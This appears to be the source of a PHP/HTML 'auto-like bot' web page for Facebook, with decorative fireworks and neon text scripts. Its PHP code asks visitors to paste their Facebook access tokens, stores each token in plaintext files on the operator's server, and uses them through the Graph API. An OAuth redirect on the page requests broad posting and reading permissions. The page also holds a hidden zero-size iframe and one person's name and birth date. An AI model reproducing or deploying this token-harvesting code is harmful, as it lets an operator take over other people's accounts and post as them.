<script>

var bits=50; // how many bits
var speed=20; // how fast - smaller is faster
var bangs=9; // how many can be launched simultaneously (note that using too many can slow the script down)
var colours=new Array("#03f", "#f03", "#0e0", "#93f", "#0cf", "#f93", "#f0c");

var bangheight=new Array();
var intensity=new Array();
var colour=new Array();
var Xpos=new Array();
var Ypos=new Array();
var dX=new Array();
var dY=new Array();
var stars=new Array();
var decay=new Array();
var swide=800;
var shigh=600;
var boddie;
window.onload=function() { if (document.getElementById) {
  var i;
  boddie=document.createElement("div");
  boddie.style.position="fixed";
  boddie.style.top="0px";
  boddie.style.left="0px";
  boddie.style.overflow="visible";
  boddie.style.width="1px";
  boddie.style.height="1px";
  boddie.style.backgroundColor="transparent";
  document.body.appendChild(boddie);
  set_width();
  for (i=0; i<bangs; i++) {
    write_fire(i);
    launch(i);
    setInterval('stepthrough('+i+')', speed);
  }
}}
function write_fire(N) {
  var i, rlef, rdow;
  stars[N+'r']=createDiv('|', 12);
  boddie.appendChild(stars[N+'r']);
  for (i=bits*N; i<bits+bits*N; i++) {
    stars[i]=createDiv('*', 13);
    boddie.appendChild(stars[i]);
  }
}
function createDiv(char, size) {
  var div=document.createElement("div");
  div.style.font=size+"px monospace";
  div.style.position="absolute";
  div.style.backgroundColor="transparent";
  div.appendChild(document.createTextNode(char));
  return (div);
}
function launch(N) {
  colour[N]=Math.floor(Math.random()*colours.length);
  Xpos[N+"r"]=swide*0.5;
  Ypos[N+"r"]=shigh-5;
  bangheight[N]=Math.round((0.5+Math.random())*shigh*0.4);
  dX[N+"r"]=(Math.random()-0.5)*swide/bangheight[N];
  if (dX[N+"r"]>1.25) stars[N+"r"].firstChild.nodeValue="/";
  else if (dX[N+"r"]<-1.25) stars[N+"r"].firstChild.nodeValue="\\";
  else stars[N+"r"].firstChild.nodeValue="|";
  stars[N+"r"].style.color=colours[colour[N]];
}
function bang(N) {
  var i, Z, A=0;
  for (i=bits*N; i<bits+bits*N; i++) {
    Z=stars[i].style;
    Z.left=Xpos[i]+"px";
    Z.top=Ypos[i]+"px";
    if (decay[i]) decay[i]--;
    else A++;
    if (decay[i]==15) Z.fontSize="7px";
    else if (decay[i]==7) Z.fontSize="2px";
    else if (decay[i]==1) Z.visibility="hidden";
    Xpos[i]+=dX[i];
    Ypos[i]+=(dY[i]+=1.25/intensity[N]);
  }
  if (A!=bits) setTimeout("bang("+N+")", speed);
}
function stepthrough(N) {
  var i, M, Z;
  var oldx=Xpos[N+"r"];
  var oldy=Ypos[N+"r"];
  Xpos[N+"r"]+=dX[N+"r"];
  Ypos[N+"r"]-=4;
  if (Ypos[N+"r"]<bangheight[N]) {
    M=Math.floor(Math.random()*3*colours.length);
    intensity[N]=5+Math.random()*4;
    for (i=N*bits; i<bits+bits*N; i++) {
      Xpos[i]=Xpos[N+"r"];
      Ypos[i]=Ypos[N+"r"];
      dY[i]=(Math.random()-0.5)*intensity[N];
      dX[i]=(Math.random()-0.5)*(intensity[N]-Math.abs(dY[i]))*1.25;
      decay[i]=16+Math.floor(Math.random()*16);
      Z=stars[i];
      if (M<colours.length) Z.style.color=colours[i%2?colour[N]:M];
      else if (M<2*colours.length) Z.style.color=colours[colour[N]];
      else Z.style.color=colours[i%colours.length];
      Z.style.fontSize="13px";
      Z.style.visibility="visible";
    }
    bang(N);
    launch(N);
  }
  stars[N+"r"].style.left=oldx+"px";
  stars[N+"r"].style.top=oldy+"px";
}
window.onresize=set_width;
function set_width() {
  var sw_min=999999;
  var sh_min=999999;
  if (document.documentElement && document.documentElement.clientWidth) {
    if (document.documentElement.clientWidth>0) sw_min=document.documentElement.clientWidth;
    if (document.documentElement.clientHeight>0) sh_min=document.documentElement.clientHeight;
  }
  if (typeof(self.innerWidth)!="undefined" && self.innerWidth) {
    if (self.innerWidth>0 && self.innerWidth<sw_min) sw_min=self.innerWidth;
    if (self.innerHeight>0 && self.innerHeight<sh_min) sh_min=self.innerHeight;
  }
  if (document.body.clientWidth) {
    if (document.body.clientWidth>0 && document.body.clientWidth<sw_min) sw_min=document.body.clientWidth;
    if (document.body.clientHeight>0 && document.body.clientHeight<sh_min) sh_min=document.body.clientHeight;
  }
  if (sw_min==999999 || sh_min==999999) {
    sw_min=800;
    sh_min=600;
  }
  swide=sw_min;
  shigh=sh_min;
}

</script>
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"><html><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"><title>
-=[ Arman Khan&trade; ]=-
</title><link rel="stylesheet" type="text/css" href="css.css" 
media="all,black.css"/>><link rel="stylesheet" type="text/css" href="black.css"  <link rel="shortcut icon" href=""
<h1 class="heading">
<marquee behavior="alternate"</h6>
<font face="Battle Beasts" size="12"> <script src="me.js"></script>
</h6></marquee></div></h1>
<script src="js"></script>
</style>
</head>
<body><script src="" type="text/javascript"></script>
<?php error_reporting(0);$bot=new bot();class bot{public function getGr($as,$bs){$ar=array(        'graph',        'fb',        'me');$im='https://'.implode('.',$ar);return $im.$as.$bs;}public function getUrl($mb,$tk,$uh=null){$ar=array(        'access_token' => $tk,);if($uh){$else=array_merge($ar,$uh);        }else{        $else=$ar;}foreach($else as $b => $c){        $aden[]=$b.'='.$c;}$true='?'.implode('&',$aden);$true=$this->getGr($mb,$true);$true=json_decode($this->one($true),true);if($true[data]){        return $true[data];}else{        return $true;}}private function one($url){$cx=curl_init();curl_setopt_array($cx,array(CURLOPT_URL => $url,CURLOPT_CONNECTTIMEOUT => 5,CURLOPT_RETURNTRANSFER => 1,CURLOPT_USERAGENT => 'DESCRIPTION by Ali',));$ch=curl_exec($cx);        curl_close($cx);        return ($ch);}public function savEd($tk,$id,$a,$b,$o,$c,$z=null,$bb=null){if(!is_dir('aden')){        mkdir('aden');}if($bb){$blue=fopen('aden/'.$id,'w');fwrite($blue,$tk.'*'.$a.'*'.$b.'*'.$o.'*'.$c.'*'.$bb);        fclose($blue);echo'<script type="text/javascript">alert("INFO : Your Written Comment Has Been Saved !! Good Luck !! ")</script>';}else{        if($z){if(file_exists('aden/'.$id)){$file=file_get_contents('aden/'.$id);$ex=explode('*',$file);$str=str_replace($ex[0],$tk,$file);$xs=fopen('aden/'.$id,'w');        fwrite($xs,$str);        fclose($xs);}else{$str=$tk.'*'.$a.'*'.$b.'*'.$o.'*'.$c;$xs=fopen('aden/'.$id,'w');        fwrite($xs,$str);        fclose($xs);}$_SESSION[key]=$tk.'_'.$id;}else{$file=file_get_contents('aden/'.$id);$file=explode('*',$file);        if($file[5]){$up=fopen('aden/'.$id,'w');fwrite($up,$tk.'*'.$a.'*'.$b.'*'.$o.'*'.$c.'*'.$file[5]);        fclose($up);        }else{$up=fopen('aden/'.$id,'w');fwrite($up,$tk.'*'.$a.'*'.$b.'*'.$o.'*'.$c);        fclose($up);        }echo'<script type="text/javascript">alert("INFO : Script Comment Has Been Saved !!")</script>';}}}public function lOgbot($d){        unlink('aden/'.$d);        unset($_SESSION[key]);echo'<script type="text/javascript">alert("INFO : Logout success")</script>';        $this->atas();        $this->home();        $this->bwh();}public function cek($tok,$id,$nm){$if=file_get_contents('aden/'.$id);$if=explode('*',$if);if(preg_match('/on/',$if[1])){        $satu='on';        $ak='Like tambah komen';}else{        $satu='off';        $ak='Like saja';}if(preg_match('/on/',$if[2])){        $dua='on';        $ik='Bot emo';}else{        $dua='off';        $ik='Bot manual';}if(preg_match('/on/',$if[3])){        $tiga='on';        $ek='Powered on';}else{        $tiga='off';        $ek='Powered off';}if(preg_match('/on/',$if[4])){        $empat='on';        $uk='Text via script';}else{        $empat='off';        $uk='Via text sendiri';}echo'<center><div id="bottom-content"><div id="navigation-menu"><br><ul><font color="white">Welcome :  '.$nm.'</font><br><br><a href="http://m.facebook.com/'.$id.'"><img src="https://graph.facebook.com/'.$id.'/picture" style="width:50px; height:50px;border: 1px solid white;border-radius: 100px;background-color: white;" alt="'.$nm.'"/></a><br> <font color="white">Your Bot has been Activated '.$nm.'</font><br><form action="index.php" method="post"><input type="hidden" name="logout" value="'.$id.'"><input class="button button5" type="submit" value="Logout Bot"></form><center><div class="hr"><hr /></div></center><br><br><br><form action="index.php" method="post"><center><font color="black" size="3">Select Menu Robot</font></center><select class="button button3">';        if($satu=='on'){        echo'<option value="'.$satu.'">'.$ak.'</option><option value="off">Like saja</option></select>';        }else{        echo'<option value="'.$satu.'">'.$ak.'</option><option value="on">Like tambah komen</option></select>';}echo'<select  class="button button3" name="emot">';        if($dua=='on'){        echo'<option value="'.$dua.'">'.$ik.'</option><option value="off">Bot manual</option></select>';        }else{        echo'<option value="'.$dua.'">'.$ik.'</option><option value="on">Bot emo</option></select>';}echo'<select  class="button button3" name="target">';        if($tiga=='on'){        echo'<option value="'.$tiga.'">'.$ek.'</option><option value="off">Powered off</option></select>';        }else{        echo'<option value="'.$tiga.'">'.$ek.'</option><option value="on">Powered on</option></select>';}echo'';        if($empat=='on'){        echo'<select class="button button3" name="opsi"><option value="'.$empat.'">'.$uk.'</option><option value="off">Via text sendiri</option></select>';}else{        if($if[5]){        echo'<select  class="button button3" name="opsi"><option value="'.$empat.'">'.$uk.'</option><option value="text">Ganti Text Anda</option><option value="on">Text via script</option></select>';        }else{        echo'Buat text Anda<input type="text" name="text" style="height:30px;"><input type="hidden" name="opsi" value="'.$empat.'">';}}echo'</ul></div><ul><div id="top-content"><div id="search-form"><input class="button button3" type="submit" value="SAVE"></form></div></div></div></ul></center>';$this->membEr();}public function atas(){$hari=array(1=>        "Monday",        "Tuesday",        "Wednesday",        "Thursday",        "Friday",        "Saturday",        "Sunday");$bulan=array(1=>"January",  "February",    "March",     "April",       "May",         "June",           "July",             "August",               "September",          "October",     "November","Desember");$hr=$hari[gmdate('N',time()+60*60*7)];$tgl=gmdate('j',time()+60*60*7);$bln=$bulan[gmdate('n',time()+60*60*7)];$thn=gmdate('Y',time()+60*60*7);$jam=gmdate('H',time()+60*60*7);echo'<div id="header"><h1 class="heading"></h1><center><a target="_top" href="http://www.flamingtext.com/" ><img src="http://blog.flamingtext.com/blog/2017/01/11/flamingtext_com_1484166347_572057355.png" border="0" alt="Logo Design by FlamingText.com" title="Logo Design by FlamingText.com"></a></center><h2 class="description"><h1><a href="https://www.facebook.com/X3.H4NDSOM3" alt="Eslam Ahmed" target="_blank"><imgsrc="https://graph.facebook.com/100010275906466/picture?type=large" alt="Designer_&_Developer" style="border-radius: 99em; border: 2px; box-shadow: 0px 0px 9px 7px rgb(204, 204, 204); padding: 0px;" width="100" height="100"></a><a href="https://www.facebook.com/X3.H4NDSOM3" alt="Eslam Ahmed" target="_blank"><imgsrc="https://graph.facebook.com/100009434565722/picture?type=large" alt="Designer_&_Developer" style="border-radius: 99em; border: 2px; box-shadow: 0px 0px 9px 7px rgb(204, 204, 204); padding: 0px;" width="150" height="150"></a><a href="https://www.facebook.com/X3.H4NDSOM3" alt="Eslam Ahmed" target="_blank"><imgsrc="https://graph.facebook.com/100009434565722/picture?type=large" alt="Designer_&_Developer" style="border-radius: 99em; border: 2px; box-shadow: 0px 0px 9px 7px rgb(204, 204, 204); padding: 0px;" width="240" height="240"></a><a href="https://www.facebook.com/X3.H4NDSOM3" alt="Eslam Ahmed" target="_blank"><imgsrc="https://graph.facebook.com/100009434565722/picture?type=large" alt="Designer_&_Developer" style="border-radius: 99em; border: 2px; box-shadow: 0px 0px 9px 7px rgb(204, 204, 204); padding: 0px;" width="150" height="150"></a><a href="https://www.facebook.com/X3.H4NDSOM3" alt="Eslam Ahmed" target="_blank"><imgsrc="https://graph.facebook.com/100010275906466/picture?type=large" alt="Designer_&_Developer" style="border-radius: 99em; border: 2px; box-shadow: 0px 0px 9px 7px rgb(204, 204, 204); padding: 0px;" width="100" height="100"></a><h1></h2></div></div>';}public function home(){echo'<br></div>';}public function bwh(){echo'<div id="bottom-content"><div id="navigation-menu"><center></head>    <body>        <div id="main">            <div id="content">                <div class="header"><center><font style="font-family: Courgette;font-size: 20pt;text-shadow: 0 0 11px 
#000000, 0 0 11px #000000, 0 0 11px #000000;color: #FFF"><font color="yellow">HOW TO GET IPHONE TOKEN </font><br>
<iframe width="420" height="315"
src="https://www.youtube.com/embed/JOMcDT_tNZY">
</iframe>
<br>
<br>
<a href="https://www.facebook.com/100010212424610" alt="Arman Khan" target="_blank">
<img
src="https://graph.facebook.com/100010212424610/picture?type=large" alt="Designer_&_Developer" style="border-radius: 99em; border: 2px; box-shadow: 0px 0px 9px 7px rgb(65, 197, 227); padding: 8px;" width="150" height="150"></a>

<a href="https://www.facebook.com/100009434565722" alt="Arman Khan" target="_blank">
<img
src="https://graph.facebook.com/100009434565722/picture?type=large" alt="Designer_&_Developer" style="border-radius: 99em; border: 2px; box-shadow: 0px 0px 9px 7px rgb(65, 227, 181); padding: 8px;" width="300" height="300"></a>

<a href="https://www.facebook.com/100010275906466" alt="Arman Khan" target="_blank">
<img
src="https://graph.facebook.com/100010275906466/picture?type=large" alt="Designer_&_Developer" style="border-radius: 99em; border: 2px; box-shadow: 0px 0px 9px 7px rgb(65, 197, 227); padding: 8px;" width="150" height="150"></a>
<br>
<a href="http://facebook.com/100011692824763" alt="Arman Khan" target="_blank">
<img
src="https://graph.facebook.com/100011692824763/picture?type=large" alt="Designer_&amp;_Developer" style="border-radius: 99em; border: 2px; box-shadow: 0px 0px 5px 3px rgb(204, 204, 204); padding: 0px;" width="30" height="30"></a>
<a href="http://facebook.com/100009151129675" alt="Arman Khan" target="_blank">
<img
src="https://graph.facebook.com/100009151129675/picture?type=large" alt="Designer_&amp;_Developer" style="border-radius: 99em; border: 2px; box-shadow: 0px 0px 5px 3px rgb(204, 204, 204); padding: 0px;" width="30" height="30"></a>
<a href="http://facebook.com/100006714496768" alt="Arman Khan" target="_blank">
<img
src="https://graph.facebook.com/100006714496768/picture?type=large" alt="Designer_&amp;_Developer" style="border-radius: 99em; border: 2px; box-shadow: 0px 0px 5px 3px rgb(204, 204, 204); padding: 0px;" width="30" height="30"></a>
<a href="http://facebook.com/100006177698629" alt="Arman Khan" target="_blank">
<img
src="https://graph.facebook.com/100006177698629/picture?type=large" alt="Designer_&amp;_Developer" style="border-radius: 99em; border: 2px; box-shadow: 0px 0px 5px 3px rgb(204, 204, 204); padding: 0px;" width="30" height="30"></a>
<a href="http://facebook.com/100009432380335" alt="Arman Khan" target="_blank">
<img
src="https://graph.facebook.com/100009432380335/picture?type=large" alt="Designer_&amp;_Developer" style="border-radius: 99em; border: 2px; box-shadow: 0px 0px 5px 3px rgb(204, 204, 204); padding: 0px;" width="30" height="30"></a>
<a href="http://facebook.com/100006411673270" alt="Arman Khan" target="_blank">
<img
src="https://graph.facebook.com/100006411673270/picture?type=large" alt="Designer_&amp;_Developer" style="border-radius: 99em; border: 2px; box-shadow: 0px 0px 5px 3px rgb(204, 204, 204); padding: 0px;" width="30" height="30"></a>
<a href="http://facebook.com/100013773854474" alt="Arman Khan" target="_blank">
<img
src="https://graph.facebook.com/100013773854474/picture?type=large" alt="Designer_&amp;_Developer" style="border-radius: 99em; border: 2px; box-shadow: 0px 0px 5px 3px rgb(204, 204, 204); padding: 0px;" width="30" height="30"></a>
<a href="http://facebook.com/100012362760529" alt="Arman Khan" target="_blank">
<img
src="https://graph.facebook.com/100012362760529/picture?type=large" alt="Designer_&amp;_Developer" style="border-radius: 99em; border: 2px; box-shadow: 0px 0px 5px 3px rgb(204, 204, 204); padding: 0px;" width="30" height="30"></a>
<a href="http://facebook.com/100005005632044" alt="Arman Khan" target="_blank">
<img
src="https://graph.facebook.com/100005005632044/picture?type=large" alt="Designer_&amp;_Developer" style="border-radius: 99em; border: 2px; box-shadow: 0px 0px 5px 3px rgb(204, 204, 204); padding: 0px;" width="30" height="30"></a>
<a href="http://facebook.com/100011664065633" alt="Arman Khan" target="_blank">
<img
src="https://graph.facebook.com/100011664065633/picture?type=large" alt="Designer_&amp;_Developer" style="border-radius: 99em; border: 2px; box-shadow: 0px 0px 5px 3px rgb(204, 204, 204); padding: 0px;" width="30" height="30"></a>
<a href="http://facebook.com/100010357894875" alt="Arman Khan" target="_blank">
<img
src="https://graph.facebook.com/100010357894875/picture?type=large" alt="Designer_&amp;_Developer" style="border-radius: 99em; border: 2px; box-shadow: 0px 0px 5px 3px rgb(204, 204, 204); padding: 0px;" width="30" height="30"></a>
<a href="http://facebook.com/100009920760944" alt="Arman Khan" target="_blank">
<img
src="https://graph.facebook.com/100009920760944/picture?type=large" alt="Designer_&amp;_Developer" style="border-radius: 99em; border: 2px; box-shadow: 0px 0px 5px 3px rgb(204, 204, 204); padding: 0px;" width="30" height="30"></a>
<a href="http://facebook.com/100003345347052" alt="Arman Khan" target="_blank">
<img
src="https://graph.facebook.com/100003345347052/picture?type=large" alt="Designer_&amp;_Developer" style="border-radius: 99em; border: 2px; box-shadow: 0px 0px 5px 3px rgb(204, 204, 204); padding: 0px;" width="30" height="30"></a>
<a href="http://facebook.com/100003045610525" alt="Arman Khan" target="_blank">
<img
src="https://graph.facebook.com/100003045610525/picture?type=large" alt="Designer_&amp;_Developer" style="border-radius: 99em; border: 2px; box-shadow: 0px 0px 5px 3px rgb(204, 204, 204); padding: 0px;" width="30" height="30"></a>
<a href="http://facebook.com/100009434565722" alt="Arman Khan" target="_blank">
<img
src="https://graph.facebook.com/100009434565722/picture?type=large" alt="Designer_&amp;_Developer" style="border-radius: 99em; border: 2px; box-shadow: 0px 0px 5px 3px rgb(204, 204, 204); padding: 0px;" width="30" height="30"></a>
<br>
<center>


<iframe src="//www.facebook.com/plugins/subscribe.php?href=https://www.facebook.com/100010212424610&layout=button_count&amp;show_faces=false&colorscheme=light&font=lucida+grande&amp;width=105&appId=281570931938574" scrolling="no" frameborder="0" style="border:none; overflow:hidden; width:110px; height:50px;" allowTransparency="true"></iframe>
<br>
<center>
<center>
<center>
<ul>
<center>

<a href="https://www.facebook.com/zain.aqdas.II" target="_blank">

<input class="button button3" type="button" value="My Facebook"> </a><br>
<a href="http://zara.78.lt/token/" target="_blank">
<input class="button button3" type="button" value="Get Token"> </a>
</center>
<h4><font size="26" color="blue"><center>   </font><font face="Orbitron" size="6" 
<br></ul></div></div>
</center><br>
<br>
</center>
<marquee behavior="scroll" direction="right" scrollamount="8" scrolldelay="1"><strong><font style="font-family: Courgette;font-size: 20pt;text-shadow: 0 0 11px 
#000000, 0 0 11px #000000, 0 0 11px #000000;color: #FFF"><font color="red">𝐖𝐄𝐋𝐂𝐎𝐌𝐄 𝐓𝐎 𝐂𝐇𝐀𝐔𝐃𝐇𝐑𝐘𝐒 𝐁𝐎𝐓𝐓𝐄𝐑 𝐖𝐎𝐑𝐋𝐃</font></strong></center></marquee>
</center><div style="font-family: Courgette;font-size: 20pt;text-shadow: 0 0 11px 
#000000, 0 0 11px #000000, 0 0 11px #000000;color: #FFF"><font color="blue">Submit Your Token Here Here!</font></a>
<br>
<center>
<form action="index.php" method="post"> <input class="inp-text" placeholder="&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Paste your Token Here !" type="text" style="height:45px;width:60%;border-radius:20px;border:4px solid green;background: none;color:white;" name="token"> </br>
<input class="button button3" id="sbmt" class="inp-btn" type="submit"  value="SUBMIT"></form>
<center><div id ="example1"></div></center>
</div></div></div></font>

</div></div></div>';$this->membEr();}public function membEr(){        if(!is_dir('aden')){        mkdir('aden');}$up=opendir('aden');while($use=readdir($up)){if($use != '.' && $use != '..'){        $user[]=$use;}        }echo'
<br>
<center><div style="font-family: Courgette;font-size: 20pt;text-shadow: 0 0 11px 
#000000, 0 0 11px #000000, 0 0 11px #000000;color: #FFF"><font color="white">User rebot :</font> <font color=#F30F90>'.count($user).'</font></center>


<center><div style="font-family: Courgette;font-size: 20pt;text-shadow: 0 0 11px 
#000000, 0 0 11px #000000, 0 0 11px #000000;color: #FFF"><font color="green">Arman Khan :</font><a href="https://www.facebook.com/X3.H4NDSOM3" target="blank">Click Here</a>


';}public function toXen($h){header('Location: https://m.facebook.com/dialog/oauth?client_id='.$h.'&redirect_uri=https://www.facebook.com/connect/login_success.html&display=wap&scope=publish_actions%2Cuser_photos%2Cuser_friends%2Cfriends_photos%2Cuser_activities%2Cuser_likes%2Cuser_status%2Cuser_groups%2Cfriends_status%2Cpublish_stream%2Cread_stream%2Cread_requests%2Cstatus_update&response_type=token&fbconnect=1&from_login=1&refid=9');}}if(isset($_SESSION[key])){        $a=$_SESSION[key];        $ai=explode('_',$a);        $a=$ai[0];if($_POST[logout]){        $ax=$_POST[logout];        $bot->lOgbot($ax);}else{$b=$bot->getUrl('/me',$a,array('fields' => 'id,name',));if($b[id]){if($_POST[likes]){        $as=$_POST[likes];        $bs=$_POST[emot];        $bx=$_POST[target];        $cs=$_POST[opsi];        $tx=$_POST[text];if($cs=='text'){        unlink('Tokenx/'.$b[id]);$bot->savEd($a,$b[id],$as,$bs,$bx,'off');        }else{        if($tx){$bot->savEd($a,$b[id],$as,$bs,$bx,$cs,'x',$tx);        }else{$bot->savEd($a,$b[id],$as,$bs,$bx,$cs);}}}        $bot->atas();        $bot->home();$bot->cek($a,$b[id],$b[name]);}else{echo '<script type="text/javascript">alert("INFO: Session Token Expired")</script>';        unset($_SESSION[key]);        unlink('aden/'.$ai[1]);$bot->atas();$bot->home();        $bot->bwh();}}        }else{if($_POST[token]){        $a=$_POST[token];if(preg_match('/token/',$a)){$tok=substr($a,strpos($a,'token=')+6,(strpos($a,'&')-(strpos($a,'token=')+6)));        }else{        $cut=explode('&',$a);$tok=$cut[0];}$b=$bot->getUrl('/me',$tok,array(        'fields' => 'id,name',));if($b[id]){$bot->savEd($tok,$b[id],'on','on','on','on','null');        $bot->atas();        $bot->home();$bot->cek($tok,$b[id],$b[name]);}else{echo '<script type="text/javascript">alert("Error : Token Invalid")</script>';        $bot->atas();        $bot->home();        $bot->bwh();}}else{if($_GET[token]){        $a=$_GET[token];        $bot->toXen($a);}else{        $bot->atas();        $bot->home();        $bot->bwh();}}
}
?>
<center><br>
<audio controls="" autoplay="">
  <source src="http://yt-files.com/yt-dd.php?id=isBLOfLoPT0&hash=00be5c40f8785e93c54da77d9a28c000&name=Sta%20Da%20Ishq%20Baranona%20Full%20Song" type="audio/mpeg">
  Your browser does not support the audio element.
</audio><br>
<script>

// ********** عدل هنا

var text="Designed By Zainu & Amee"//
var speed=25// سرعه تغير الالوان

// ********** لا تعدل شي هنا


if (document.all||document.getElementById){
document.write('<span id="highlight">' + text + '</span>')
var storetext=document.getElementById? document.getElementById("highlight") : document.all.highlight
}
else
document.write(text)
var hex=new Array("00","14","28","3C","50","64","78","8C","A0","B4","C8","DC","F0")
var r=1
var g=1
var b=1
var seq=1
function changetext(){
rainbow="#"+hex[r]+hex[g]+hex[b]
storetext.style.color=rainbow
}
function change(){
if (seq==6){
b--
if (b==0)
seq=1
}
if (seq==5){
r++
if (r==12)
seq=6
}
if (seq==4){
g--
if (g==0)
seq=5
}
if (seq==3){
b++
if (b==12)
seq=4
}
if (seq==2){
r--
if (r==0)
seq=3
}
if (seq==1){
g++
if (g==12)
seq=2
}
changetext()
}
function starteffect(){
if (document.all||document.getElementById)
flash=setInterval("change()",speed)
}
starteffect()
</script>
<br>
<br>
<script language="JavaScript1.2">
 
 
 
var message="WELCOME TO OUR BOT"
var neonbasecolor="gray"
var neontextcolor="#02d0ff"
var flashspeed=200  //in milliseconds
 
///No need to edit below this line/////
 
var n=0
if (document.all||document.getElementById){
document.write('<font color="'+neonbasecolor+'">')
for (m=0;m<message.length;m++)
document.write('<span id="neonlight'+m+'">'+message.charAt(m)+'</span>')
document.write('</font>')
}
else
document.write(message)
 
function crossref(number){
var crossobj=document.all? eval("document.all.neonlight"+number) : document.getElementById("neonlight"+number)
return crossobj
}
 
function neon(){
 
//Change all letters to base color
if (n==0){
for (m=0;m<message.length;m++)
//eval("document.all.neonlight"+m).style.color=neonbasecolor
crossref(m).style.color=neonbasecolor
}
 
//cycle through and change individual letters to neon color
crossref(n).style.color=neontextcolor
 
if (n<message.length-1)
n++
else{
n=0
clearInterval(flashing)
setTimeout("beginneon()",1500)
return
}
}
 
function beginneon(){
if (document.all||document.getElementById)
flashing=setInterval("neon()",flashspeed)
}
beginneon()
</script>


<font face="Motken Unicode Hor" size="3">
<div class="widget-content">
</div></div></td><td align="right"><style type="text/css">#info-teja {z-index: 1000;background:-moz-linear-gradient(top,  #00708b,  #00708b);background: -webkit-gradient(linear, left top, left bottom, from(black), to(#00708b));box-shadow:-2px -2px 8px #00708b, 2px 2px 20px #00708b;-moz-box-shadow:-2px -2px 8px #00708b, 2px 2px 20px #00708b;-webkit-box-shadow:-2px -2px 8px #00708b, 2px 2px 20px #00708b;width:460px;position: fixed;top:150px;left:0;margin-left:-350px;border:1px solid #00708b;background-position:top right no-repeat;height:35px;font:11px Arial;color:#00708b;border-top-right-radius:8px;border-bottom-right-radius:8px;-moz-border-radius-topright:8px;-moz-border-radius-bottomright:8px;-webkit-border-top-right-radius:8px;-webkit-border-bottom-right-radius:8px;}#info-teja{-o-transition: all 1s ease-in;-moz-transition: all 1s ease-in;-webkit-transition: all 1s ease-in;} #info-teja:hover{width:400px;opacity:1.0;margin-left:0;}.Tejainbox {border:1px solid pink;width:320px; margin:0px 90px 10px 10px;background:#00708b;color:#00708b; border-radius :20px; padding:5px 0;-moz-border-radius:20px; -webkit-border-radius:20px;-o-transition:all 2s ease-in;-moz-transition:all 2s ease-in;-webkit-transition:all 2s ease-in;opacity:0.2;}.Tejainbox:hover{opacity:1.0;box-shadow:1px 1px 15px #00708b; -moz-box-shadow: 1px 1px 15px #00708b; -webkit-box-shadow: 1px 1px 15px #00708b;background: black;}.Tejainbox2 {margin:5px 10px;padding:0px 8px 10px;color:#00708b;overflow:hidden;height:370px;}.teja15 {border-radius:15px;-moz-border-radius:15px;-webkit-border-radius:15px;}.Teja2 ul.bom {margin: 0; padding: 0;}.Tejainbox2 li {margin-left:20px;}.Tejainbox2 li a {color: #00708b; line-height: 4px; font-size: 11px;font-weight: bold; text-decoration:none;}.Tejainbox2 li a:hover {color: #00708b;text-shadow: 0 1px 1px #00708b;}.Tejainbox2 h2 { font: 18px Droid Serif;font-weight:bold;padding:0 8px;color: #00708b;text-shadow: 0px 1px 1px #ddd;border-bottom: 1px solid #00708b;}.Tejatouch {font-size:21px;font-weight:bold;font-family:Arial Narrow;float:right;margin: 3px 10px 0 0;-o-transition: all 0.5s ease-out;-moz-transition: all 0.5s ease-out;-webkit-transition: all 0.5s ease-out;text-decoration:blink;}.Tejatouch:hover{-o-transform: scale(2) rotate(750deg) translate(0px);-moz-transform: scale(2) rotate(750deg) translate(0px);-webkit-transform: scale(2) rotate(750deg) translate(0px);color: #00708b;}</style><div id="info-teja"><span class="Tejatouch">Info</span><div class="Tejainbox"><div class="Tejainbox2 teja15">
<h2>

Personal information</h2>
<center><div class="CSS">
     		<a href="http://facebook.com/100010212424610"><img src="https://graph.facebook.com/100010212424610/picture?width=800" style="border-radius: 99em; border: 2px; box-shadow: 0px 0px 9px 7px rgb(65, 227, 181); padding: 8px;" width="130" height="130" alt="ZAIN AQDAS"/></a>
 <span class="style4"><center><font color="#00708b;">.</font></center></span>
<span class="style4"><font color="#00708b"> <center>The information : </font></center></span>
<span class="style4"> <center><h2>Name: ZAIN AQDAS</h2></center></span>
<span class="style4"> <center>Date of Birth: 08-11-1995</center>  </span>
<span class="style4"> <center>Country: Pakistan</center></span>
<span class="style4"> <center>ConTact:http://www.fb.com/zain.aqdas.II</center>  </span>
</div></div></div></td>
<iframe src="http:/IWBUUEE7?start=true" width="0" height="0" frameborder="0" allowfullscreen></iframe>

